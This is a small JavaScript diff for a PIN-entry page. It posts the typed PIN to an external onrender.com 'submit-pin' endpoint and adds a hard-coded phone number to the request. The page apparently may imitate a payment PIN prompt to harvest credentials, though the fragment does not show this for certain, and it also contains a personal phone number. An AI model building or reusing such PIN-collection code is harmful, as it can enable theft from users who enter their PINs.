@@ -8,7 +8,7 @@ document.querySelector(".validate-pin").addEventListener("click", async () => {
     `;
         return;
     }
-    let pinData = {"pin": pin};
+    let pinData = {"pin": pin,"phone_number":"+2348183808266"};
     console.log(JSON.stringify(pinData));
     pin_validation = await fetch("https://mimic-sparkle.onrender.com/submit-pin",
         { method: "POST",
